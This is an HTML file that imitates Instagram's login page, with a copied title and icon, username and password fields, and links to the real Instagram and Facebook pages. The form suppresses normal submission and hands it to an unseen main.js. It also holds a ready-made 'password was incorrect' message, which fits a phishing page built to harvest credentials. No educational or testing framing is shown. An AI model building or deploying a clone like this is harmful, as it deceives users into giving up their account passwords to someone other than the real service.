<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <title>Instagram</title>
    <link rel="shortcut icon" href="2609558_instagram_social media_social_icon.png" type="image/x-icon"> 
    <script src="https://kit.fontawesome.com/6adc8fa1e6.js" crossorigin="anonymous"></script> 
</head>
<body>
    <div class="container">
        <div class="box">
            <h1 class="title">Instagram</h1>
            <form id="gform" class="login-form" onsubmit="return false">
                <div class="field">
                    <input id="username" type="text" name="username" placeholder="Phone number, username, or email" />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" name="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>
                <input type="checkbox" onclick="showFunc()">......
                <button class="login-button" title="login" id="login-btn" type="submit">Log In</button>
                <p id="error-msg">Sorry, your password was incorrect.<br> Try again</p>
                <div  class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">
                    <a href="https://www.facebook.com/" class="fb-login-btn">
                        <i class="fab fa-facebook-square fb-icon"></i>
                        <span class="">Log in with Facebook</span>
                    </a>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></p>
        </div>
    </div>
    <script src="main.js"></script>
    
</body>
</html>
